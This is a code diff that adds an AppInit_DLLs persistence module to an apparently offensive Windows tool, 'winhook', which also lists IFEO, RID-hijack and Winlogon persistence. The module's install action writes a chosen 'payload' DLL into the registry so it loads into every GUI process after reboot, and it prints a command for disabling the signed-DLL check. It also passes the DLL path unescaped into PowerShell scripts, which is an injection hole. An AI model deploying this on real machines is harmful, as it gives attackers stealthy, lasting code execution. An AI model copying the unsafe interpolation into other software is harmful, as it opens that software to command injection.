@@ -24452,6 +24452,172 @@ Write-Output "STATUS=SUCCESS"
   return { output: output.join("\n"), findings }
 }
 
+async function appinitDll(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const dll = argVal(args, "--dll")
+  const scope = argVal(args, "--scope") || "machine"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] AppInit_DLLs Persistence...\n"]
+
+  const regPath = scope === "wow64"
+    ? "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
+    : "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== AppInit_DLLs Configuration ==="
+Write-Output ""
+
+# Native (64-bit)
+$native = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows' -ErrorAction SilentlyContinue
+Write-Output "[*] Native (64-bit):"
+Write-Output "    AppInit_DLLs: $($native.AppInit_DLLs)"
+Write-Output "    LoadAppInit_DLLs: $($native.LoadAppInit_DLLs)"
+Write-Output "    RequireSignedAppInit_DLLs: $($native.RequireSignedAppInit_DLLs)"
+if ($native.LoadAppInit_DLLs -eq 1) {
+  Write-Output "    [!] Loading ENABLED — DLLs in AppInit_DLLs are injected into all User32.dll processes"
+}
+if ($native.RequireSignedAppInit_DLLs -eq 1) {
+  Write-Output "    [!] Signature requirement ENABLED — only signed DLLs will load"
+}
+Write-Output ""
+
+# Wow64 (32-bit)
+$wow = Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows' -ErrorAction SilentlyContinue
+if ($wow) {
+  Write-Output "[*] Wow64 (32-bit):"
+  Write-Output "    AppInit_DLLs: $($wow.AppInit_DLLs)"
+  Write-Output "    LoadAppInit_DLLs: $($wow.LoadAppInit_DLLs)"
+  Write-Output "    RequireSignedAppInit_DLLs: $($wow.RequireSignedAppInit_DLLs)"
+  if ($wow.LoadAppInit_DLLs -eq 1) {
+    Write-Output "    [!] Loading ENABLED (32-bit)"
+  }
+}
+Write-Output ""
+
+# Secure Boot check
+$sb = Confirm-SecureBootUEFI -ErrorAction SilentlyContinue
+Write-Output "[*] Secure Boot: $(if ($sb) { 'ENABLED — RequireSignedAppInit_DLLs enforced by kernel' } else { 'DISABLED or not available' })"
+Write-Output ""
+Write-Output "[*] AppInit_DLLs loads into EVERY process that imports User32.dll"
+Write-Output "[*] On Windows 8+, LoadAppInit_DLLs=0 by default (must enable)"
+Write-Output "[*] On Windows 8+ with Secure Boot, unsigned DLLs are blocked"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("Loading ENABLED")) {
+      findings.push({
+        checkId: "WIN-APPI-001",
+        provider: "windows",
+        severity: "high",
+        status: "ENABLED",
+        resource: "registry://appinit",
+        title: "AppInit_DLLs loading is enabled — DLLs injected into all GUI processes",
+        details: "LoadAppInit_DLLs=1 means any DLL in AppInit_DLLs value will be loaded into every User32.dll process.",
+        remediation: "Set LoadAppInit_DLLs to 0 unless required by specific software.",
+      })
+    }
+  }
+
+  if (action === "install") {
+    if (!dll) {
+      output.push("ERROR: --dll required (path to DLL)")
+      output.push("")
+      output.push("Usage: winhook appinit_dll --action install --dll C:\\path\\payload.dll")
+      output.push("")
+      output.push("Scopes:")
+      output.push("  --scope machine  — 64-bit processes (default)")
+      output.push("  --scope wow64    — 32-bit processes on 64-bit OS")
+      output.push("")
+      output.push("[!] WARNING: Buggy DLLs will crash EVERY GUI application")
+      output.push("[!] Test your DLL thoroughly before deploying")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+Write-Output "=== Installing AppInit_DLL ==="
+Write-Output "DLL: ${dll}"
+Write-Output "Scope: ${scope}"
+Write-Output ""
+
+$regPath = '${regPath}'
+
+# Get current value and append
+$current = (Get-ItemProperty $regPath -Name AppInit_DLLs -ErrorAction SilentlyContinue).AppInit_DLLs
+if ($current) {
+  $new = "$current ${dll}"
+} else {
+  $new = "${dll}"
+}
+
+# Set DLL path
+Set-ItemProperty $regPath -Name AppInit_DLLs -Value $new -Type String
+
+# Enable loading
+Set-ItemProperty $regPath -Name LoadAppInit_DLLs -Value 1 -Type DWord
+
+# Check signature requirement
+$sigReq = (Get-ItemProperty $regPath -Name RequireSignedAppInit_DLLs -ErrorAction SilentlyContinue).RequireSignedAppInit_DLLs
+if ($sigReq -eq 1) {
+  Write-Output "[!] RequireSignedAppInit_DLLs=1 — your DLL must be signed"
+  Write-Output "[*] To disable (risky): Set-ItemProperty '$regPath' -Name RequireSignedAppInit_DLLs -Value 0"
+}
+
+$verify = Get-ItemProperty $regPath
+Write-Output "[+] AppInit_DLLs: $($verify.AppInit_DLLs)"
+Write-Output "[+] LoadAppInit_DLLs: $($verify.LoadAppInit_DLLs)"
+Write-Output ""
+Write-Output "[*] DLL will be loaded into all new processes that import User32.dll"
+Write-Output "[*] Already-running processes are NOT affected (only new processes)"
+Write-Output ""
+Write-Output "Remove: winhook appinit_dll --action remove --dll ${dll}"
+Write-Output "STATUS=SUCCESS"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS")) {
+      findings.push({
+        checkId: "WIN-APPI-010",
+        provider: "windows",
+        severity: "critical",
+        status: "PERSISTED",
+        resource: `appinit://${scope}`,
+        title: `AppInit_DLLs persistence installed: ${dll} (${scope})`,
+        details: "DLL will be injected into every User32.dll process. Persists across reboots.",
+        remediation: `Remove: winhook appinit_dll --action remove --dll ${dll}`,
+      })
+    }
+  }
+
+  if (action === "remove") {
+    if (!dll) {
+      output.push("ERROR: --dll required (DLL path to remove)")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+$regPath = '${regPath}'
+$current = (Get-ItemProperty $regPath -Name AppInit_DLLs).AppInit_DLLs
+$new = ($current -split ' ' | Where-Object { $_ -ne '${dll}' }) -join ' '
+Set-ItemProperty $regPath -Name AppInit_DLLs -Value $new -Type String
+
+if (-not $new.Trim()) {
+  Set-ItemProperty $regPath -Name LoadAppInit_DLLs -Value 0 -Type DWord
+  Write-Output "[+] No DLLs remaining — disabled LoadAppInit_DLLs"
+}
+
+Write-Output "[+] Removed ${dll} from AppInit_DLLs"
+Write-Output "[*] New value: $new"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -28097,6 +28263,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   ifeo_persist: ifeoPersist,
   rid_hijack: ridHijack,
   winlogon_persist: winlogonPersist,
+  appinit_dll: appinitDll,
 }
 
 export const WinhookTool = Tool.define("winhook", {
